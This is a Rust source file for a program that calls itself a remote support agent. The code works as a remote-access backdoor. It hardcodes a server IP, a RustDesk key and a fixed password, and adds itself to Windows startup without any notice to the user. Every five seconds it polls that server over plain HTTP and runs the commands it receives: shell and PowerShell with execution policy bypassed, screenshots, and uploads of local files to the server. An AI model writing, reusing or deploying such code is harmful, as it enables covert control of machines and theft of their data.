/*
    USTAJON AGENT v2.0 - RELIABLE REMOTE SUPPORT
    Simple, stable, and works everywhere
*/

use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::process::Command;
use std::time::Duration;
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use sysinfo::{System, Disks, CpuRefreshKind, RefreshKind};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

// ============ CONFIGURATION ============
const SERVER_URL: &str = "http://31.220.75.75";
const RUSTDESK_SERVER: &str = "31.220.75.75";
const RUSTDESK_KEY: &str = "YHo+N4vp+ZWP7wedLh69zCGk3aFf4935hwDKX9OdFXE=";
const RUSTDESK_PASSWORD: &str = "ustajon2025";
const HEARTBEAT_INTERVAL: u64 = 5; // seconds
const VERSION: &str = "2.0.0";

// ============ DATA STRUCTURES ============
#[derive(Debug, Serialize)]
struct RegisterData {
    client_id: String,
    hostname: String,
    username: String,
    os: String,
    os_version: String,
    local_ip: String,
    rustdesk_id: String,
    version: String,
    cpu_usage: f32,
    ram_usage: f32,
    disk_usage: f32,
}

#[derive(Debug, Serialize)]
struct HeartbeatData {
    client_id: String,
    cpu_usage: f32,
    ram_usage: f32,
    disk_usage: f32,
}

#[derive(Debug, Deserialize)]
struct HeartbeatResponse {
    success: bool,
    commands: Vec<AgentCommand>,
}

#[derive(Debug, Deserialize, Clone)]
struct AgentCommand {
    id: String,
    #[serde(rename = "type")]
    cmd_type: String,
    command: Option<String>,
}

#[derive(Debug, Serialize)]
struct CommandResult {
    command_id: String,
    success: bool,
    output: String,
}

#[derive(Debug, Serialize)]
struct ScreenshotUpload {
    client_id: String,
    command_id: String,
    image: String, // base64
}

// ============ AGENT ============
struct Agent {
    client_id: String,
    client: Client,
    system: System,
    disks: Disks,
    rustdesk_id: String,
}

impl Agent {
    fn new() -> Self {
        let client_id = Self::get_or_create_client_id();
        let rustdesk_id = Self::get_rustdesk_id().unwrap_or_else(|| "unknown".to_string());
        
        println!("[*] Agent ID: {}", client_id);
        println!("[*] RustDesk ID: {}", rustdesk_id);
        
        Self {
            client_id,
            client: Client::builder()
                .timeout(Duration::from_secs(30))
                .build()
                .expect("Failed to create HTTP client"),
            system: System::new_all(),
            disks: Disks::new_with_refreshed_list(),
            rustdesk_id,
        }
    }
    
    fn get_or_create_client_id() -> String {
        let config_dir = dirs::data_local_dir()
            .unwrap_or_else(|| std::env::temp_dir())
            .join("UstajonAgent");
        
        let id_file = config_dir.join("client_id.txt");
        
        if id_file.exists() {
            if let Ok(id) = fs::read_to_string(&id_file) {
                let id = id.trim().to_string();
                if !id.is_empty() {
                    return id;
                }
            }
        }
        
        // Generate new ID
        let new_id = uuid::Uuid::new_v4().to_string()[..8].to_string();
        let _ = fs::create_dir_all(&config_dir);
        let _ = fs::write(&id_file, &new_id);
        
        new_id
    }
    
    fn get_rustdesk_id() -> Option<String> {
        // Try to read RustDesk ID from config
        let config_paths = vec![
            dirs::config_dir().map(|p| p.join("RustDesk").join("RustDesk.toml")),
            dirs::data_local_dir().map(|p| p.join("RustDesk").join("config").join("RustDesk.toml")),
            Some(std::path::PathBuf::from("C:\\Users\\Public\\RustDesk\\config\\RustDesk.toml")),
        ];
        
        for path_opt in config_paths {
            if let Some(path) = path_opt {
                if path.exists() {
                    if let Ok(content) = fs::read_to_string(&path) {
                        for line in content.lines() {
                            if line.starts_with("id") {
                                if let Some(id) = line.split('=').nth(1) {
                                    let id = id.trim().trim_matches('\'').trim_matches('"');
                                    if !id.is_empty() {
                                        return Some(id.to_string());
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        // If not found, try to get from RustDesk process or generate placeholder
        None
    }
    
    fn setup_rustdesk(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Setting up RustDesk...");
        
        // Create RustDesk config directory
        let config_dirs = vec![
            dirs::config_dir().map(|p| p.join("RustDesk")),
            dirs::data_local_dir().map(|p| p.join("RustDesk").join("config")),
        ];
        
        let config_content = format!(
            r#"rendezvous_server = '{}'
nat_type = 1
serial = 0

[options]
direct-server = 'Y'
allow-auto-disconnect = 'Y'
enable-keyboard = 'Y'
custom-rendezvous-server = '{}'
relay-server = '{}'
key = '{}'
"#,
            RUSTDESK_SERVER, RUSTDESK_SERVER, RUSTDESK_SERVER, RUSTDESK_KEY
        );
        
        for dir_opt in config_dirs {
            if let Some(dir) = dir_opt {
                let _ = fs::create_dir_all(&dir);
                let config_file = dir.join("RustDesk2.toml");
                let _ = fs::write(&config_file, &config_content);
                println!("[+] Config written to: {:?}", config_file);
            }
        }
        
        // Set permanent password via registry on Windows
        #[cfg(windows)]
        {
            if let Ok(hkcu) = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER)
                .create_subkey("Software\\RustDesk\\RustDesk\\config")
            {
                let _ = hkcu.0.set_value("permanent_password", &RUSTDESK_PASSWORD);
                println!("[+] RustDesk password set via registry");
            }
        }
        
        Ok(())
    }
    
    fn add_to_startup(&self) -> Result<(), Box<dyn std::error::Error>> {
        #[cfg(windows)]
        {
            use std::env;
            
            if let Ok(exe_path) = env::current_exe() {
                // Add to registry startup
                if let Ok(hkcu) = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER)
                    .create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                {
                    let _ = hkcu.0.set_value("UstajonAgent", &exe_path.to_string_lossy().to_string());
                    println!("[+] Added to startup");
                }
            }
        }
        
        Ok(())
    }
    
    fn get_system_info(&mut self) -> (f32, f32, f32) {
        self.system.refresh_all();
        self.disks.refresh_list();
        
        let cpu_usage = self.system.global_cpu_info().cpu_usage();
        
        let total_mem = self.system.total_memory() as f64;
        let used_mem = self.system.used_memory() as f64;
        let ram_usage = if total_mem > 0.0 { (used_mem / total_mem * 100.0) as f32 } else { 0.0 };
        
        let mut disk_usage = 0.0f32;
        for disk in self.disks.iter() {
            let total = disk.total_space() as f64;
            let available = disk.available_space() as f64;
            if total > 0.0 {
                disk_usage = ((total - available) / total * 100.0) as f32;
                break; // Just use first disk
            }
        }
        
        (cpu_usage, ram_usage, disk_usage)
    }
    
    async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Registering with server...");
        
        let (cpu, ram, disk) = self.get_system_info();
        
        let local_ip = local_ip_address::local_ip()
            .map(|ip| ip.to_string())
            .unwrap_or_else(|_| "unknown".to_string());
        
        let data = RegisterData {
            client_id: self.client_id.clone(),
            hostname: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
            username: whoami::username(),
            os: std::env::consts::OS.to_string(),
            os_version: System::os_version().unwrap_or_else(|| "unknown".to_string()),
            local_ip,
            rustdesk_id: self.rustdesk_id.clone(),
            version: VERSION.to_string(),
            cpu_usage: cpu,
            ram_usage: ram,
            disk_usage: disk,
        };
        
        let url = format!("{}/api/register", SERVER_URL);
        
        match self.client.post(&url).json(&data).send().await {
            Ok(resp) => {
                if resp.status().is_success() {
                    println!("[+] Registered successfully");
                    Ok(())
                } else {
                    println!("[-] Registration failed: {}", resp.status());
                    Err("Registration failed".into())
                }
            }
            Err(e) => {
                println!("[-] Connection error: {}", e);
                Err(e.into())
            }
        }
    }
    
    async fn heartbeat(&mut self) -> Result<Vec<AgentCommand>, Box<dyn std::error::Error>> {
        let (cpu, ram, disk) = self.get_system_info();
        
        let data = HeartbeatData {
            client_id: self.client_id.clone(),
            cpu_usage: cpu,
            ram_usage: ram,
            disk_usage: disk,
        };
        
        let url = format!("{}/api/heartbeat", SERVER_URL);
        
        let resp = self.client.post(&url)
            .json(&data)
            .send()
            .await?;
        
        if resp.status().is_success() {
            let result: HeartbeatResponse = resp.json().await?;
            Ok(result.commands)
        } else {
            Ok(vec![])
        }
    }
    
    async fn execute_command(&mut self, cmd: &AgentCommand) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Executing command: {} ({})", cmd.cmd_type, cmd.id);
        
        let result = match cmd.cmd_type.as_str() {
            "cmd" | "shell" => self.run_shell_command(cmd.command.as_deref().unwrap_or("")),
            "powershell" => self.run_powershell(cmd.command.as_deref().unwrap_or("")),
            "screenshot" => {
                return self.capture_and_upload_screenshot(&cmd.id).await;
            }
            "system_info" => self.get_detailed_system_info(),
            "process_list" => self.get_process_list(),
            "kill_process" => self.kill_process(cmd.command.as_deref().unwrap_or("")),
            "list_files" => self.list_directory(cmd.command.as_deref().unwrap_or("C:\\")),
            "download_file" => {
                return self.upload_file_to_server(&cmd.id, cmd.command.as_deref().unwrap_or("")).await;
            }
            "shutdown" => self.shutdown_system(),
            "restart" => self.restart_system(),
            _ => format!("Unknown command type: {}", cmd.cmd_type),
        };
        
        // Send result back
        self.send_command_result(&cmd.id, true, &result).await?;
        
        Ok(())
    }
    
    fn run_shell_command(&self, command: &str) -> String {
        println!("[*] Running: {}", command);
        
        #[cfg(windows)]
        let output = Command::new("cmd")
            .args(["/C", command])
            .output();
        
        #[cfg(not(windows))]
        let output = Command::new("sh")
            .args(["-c", command])
            .output();
        
        match output {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let stderr = String::from_utf8_lossy(&out.stderr);
                if stderr.is_empty() {
                    stdout.to_string()
                } else {
                    format!("{}\n{}", stdout, stderr)
                }
            }
            Err(e) => format!("Error: {}", e),
        }
    }
    
    fn run_powershell(&self, command: &str) -> String {
        println!("[*] Running PowerShell: {}", command);
        
        #[cfg(windows)]
        {
            let output = Command::new("powershell")
                .args(["-ExecutionPolicy", "Bypass", "-Command", command])
                .output();
            
            match output {
                Ok(out) => {
                    let stdout = String::from_utf8_lossy(&out.stdout);
                    let stderr = String::from_utf8_lossy(&out.stderr);
                    format!("{}{}", stdout, stderr)
                }
                Err(e) => format!("Error: {}", e),
            }
        }
        
        #[cfg(not(windows))]
        {
            "PowerShell not available on this system".to_string()
        }
    }
    
    fn get_detailed_system_info(&mut self) -> String {
        self.system.refresh_all();
        self.disks.refresh_list();
        
        let mut info = String::new();
        
        info.push_str(&format!("=== System Info ===\n"));
        info.push_str(&format!("Hostname: {}\n", whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string())));
        info.push_str(&format!("Username: {}\n", whoami::username()));
        info.push_str(&format!("OS: {} {}\n", System::name().unwrap_or_default(), System::os_version().unwrap_or_default()));
        info.push_str(&format!("Kernel: {}\n", System::kernel_version().unwrap_or_default()));
        
        info.push_str(&format!("\n=== CPU ===\n"));
        info.push_str(&format!("Usage: {:.1}%\n", self.system.global_cpu_info().cpu_usage()));
        info.push_str(&format!("Cores: {}\n", self.system.cpus().len()));
        
        info.push_str(&format!("\n=== Memory ===\n"));
        let total_mem = self.system.total_memory() / 1024 / 1024;
        let used_mem = self.system.used_memory() / 1024 / 1024;
        info.push_str(&format!("Total: {} MB\n", total_mem));
        info.push_str(&format!("Used: {} MB\n", used_mem));
        info.push_str(&format!("Free: {} MB\n", total_mem - used_mem));
        
        info.push_str(&format!("\n=== Disks ===\n"));
        for disk in self.disks.iter() {
            let total = disk.total_space() / 1024 / 1024 / 1024;
            let free = disk.available_space() / 1024 / 1024 / 1024;
            info.push_str(&format!("{}: {} GB total, {} GB free\n", 
                disk.mount_point().display(), total, free));
        }
        
        info
    }
    
    fn get_process_list(&mut self) -> String {
        self.system.refresh_all();
        
        let mut processes: Vec<String> = vec![];
        processes.push("PID\tCPU%\tMem MB\tName".to_string());
        processes.push("-".repeat(50));
        
        let mut proc_list: Vec<_> = self.system.processes().iter().collect();
        proc_list.sort_by(|a, b| {
            b.1.cpu_usage().partial_cmp(&a.1.cpu_usage()).unwrap_or(std::cmp::Ordering::Equal)
        });
        
        for (pid, process) in proc_list.iter().take(50) {
            let mem_mb = process.memory() / 1024 / 1024;
            processes.push(format!("{}\t{:.1}\t{}\t{}", 
                pid, process.cpu_usage(), mem_mb, process.name()));
        }
        
        processes.join("\n")
    }
    
    fn kill_process(&self, pid_str: &str) -> String {
        if let Ok(pid) = pid_str.trim().parse::<u32>() {
            #[cfg(windows)]
            {
                let output = Command::new("taskkill")
                    .args(["/F", "/PID", &pid.to_string()])
                    .output();
                
                match output {
                    Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
                    Err(e) => format!("Error: {}", e),
                }
            }
            
            #[cfg(not(windows))]
            {
                let output = Command::new("kill")
                    .args(["-9", &pid.to_string()])
                    .output();
                
                match output {
                    Ok(_) => format!("Process {} killed", pid),
                    Err(e) => format!("Error: {}", e),
                }
            }
        } else {
            format!("Invalid PID: {}", pid_str)
        }
    }
    
    fn list_directory(&self, path: &str) -> String {
        let path = Path::new(path);
        
        if !path.exists() {
            return format!("Path not found: {:?}", path);
        }
        
        match fs::read_dir(path) {
            Ok(entries) => {
                let mut result = vec![format!("Directory: {:?}\n", path)];
                result.push("Type\tSize\tName".to_string());
                result.push("-".repeat(50));
                
                for entry in entries.flatten() {
                    let metadata = entry.metadata().ok();
                    let file_type = if entry.path().is_dir() { "DIR" } else { "FILE" };
                    let size = metadata.map(|m| m.len()).unwrap_or(0);
                    let name = entry.file_name().to_string_lossy().to_string();
                    
                    result.push(format!("{}\t{}\t{}", file_type, size, name));
                }
                
                result.join("\n")
            }
            Err(e) => format!("Error reading directory: {}", e),
        }
    }
    
    async fn capture_and_upload_screenshot(&self, command_id: &str) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Capturing screenshot...");
        
        // Capture screenshot
        let screens = screenshots::Screen::all()?;
        
        if screens.is_empty() {
            self.send_command_result(command_id, false, "No screens found").await?;
            return Ok(());
        }
        
        let screen = &screens[0];
        let image = screen.capture()?;
        
        // Convert to JPEG using raw buffer
        let width = image.width();
        let height = image.height();
        let buffer = image.as_raw();
        
        let img = image::RgbaImage::from_raw(width, height, buffer.to_vec())
            .ok_or("Failed to create image")?;
        
        let mut jpeg_data = Vec::new();
        let encoder = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut jpeg_data, 80);
        img.write_with_encoder(encoder)?;
        
        // Upload
        let base64_image = BASE64.encode(&jpeg_data);
        
        let data = ScreenshotUpload {
            client_id: self.client_id.clone(),
            command_id: command_id.to_string(),
            image: base64_image,
        };
        
        let url = format!("{}/api/agent/screenshot", SERVER_URL);
        self.client.post(&url).json(&data).send().await?;
        
        println!("[+] Screenshot uploaded");
        Ok(())
    }
    
    async fn upload_file_to_server(&self, command_id: &str, file_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Uploading file: {}", file_path);
        
        let path = Path::new(file_path);
        if !path.exists() {
            self.send_command_result(command_id, false, &format!("File not found: {}", file_path)).await?;
            return Ok(());
        }
        
        let file_data = fs::read(path)?;
        let base64_data = BASE64.encode(&file_data);
        let filename = path.file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "unknown".to_string());
        
        let mut data = HashMap::new();
        data.insert("client_id", self.client_id.clone());
        data.insert("command_id", command_id.to_string());
        data.insert("filename", filename);
        data.insert("data", base64_data);
        
        let url = format!("{}/api/agent/file-upload", SERVER_URL);
        self.client.post(&url).json(&data).send().await?;
        
        println!("[+] File uploaded");
        Ok(())
    }
    
    fn shutdown_system(&self) -> String {
        #[cfg(windows)]
        {
            let _ = Command::new("shutdown")
                .args(["/s", "/t", "5"])
                .spawn();
            "System shutting down in 5 seconds...".to_string()
        }
        
        #[cfg(not(windows))]
        {
            let _ = Command::new("shutdown")
                .args(["-h", "now"])
                .spawn();
            "System shutting down...".to_string()
        }
    }
    
    fn restart_system(&self) -> String {
        #[cfg(windows)]
        {
            let _ = Command::new("shutdown")
                .args(["/r", "/t", "5"])
                .spawn();
            "System restarting in 5 seconds...".to_string()
        }
        
        #[cfg(not(windows))]
        {
            let _ = Command::new("shutdown")
                .args(["-r", "now"])
                .spawn();
            "System restarting...".to_string()
        }
    }
    
    async fn send_command_result(&self, command_id: &str, success: bool, output: &str) -> Result<(), Box<dyn std::error::Error>> {
        let data = CommandResult {
            command_id: command_id.to_string(),
            success,
            output: output.to_string(),
        };
        
        let url = format!("{}/api/agent/command-result", SERVER_URL);
        self.client.post(&url).json(&data).send().await?;
        
        Ok(())
    }
    
    async fn run(&mut self) {
        println!("╔══════════════════════════════════════════════════════════════╗");
        println!("║           USTAJON AGENT v2.0 - Remote Support                ║");
        println!("╚══════════════════════════════════════════════════════════════╝");
        
        // Setup
        let _ = self.setup_rustdesk();
        let _ = self.add_to_startup();
        
        // Main loop
        loop {
            // Register/heartbeat
            match self.heartbeat().await {
                Ok(commands) => {
                    for cmd in commands {
                        if let Err(e) = self.execute_command(&cmd).await {
                            println!("[-] Command error: {}", e);
                        }
                    }
                }
                Err(_) => {
                    // Try to register if heartbeat fails
                    let _ = self.register().await;
                }
            }
            
            tokio::time::sleep(Duration::from_secs(HEARTBEAT_INTERVAL)).await;
        }
    }
}

#[tokio::main]
async fn main() {
    // Hide console on Windows in release mode
    #[cfg(all(windows, not(debug_assertions)))]
    {
        // Window is already hidden when compiled with windows subsystem
    }
    
    let mut agent = Agent::new();
    agent.run().await;
}
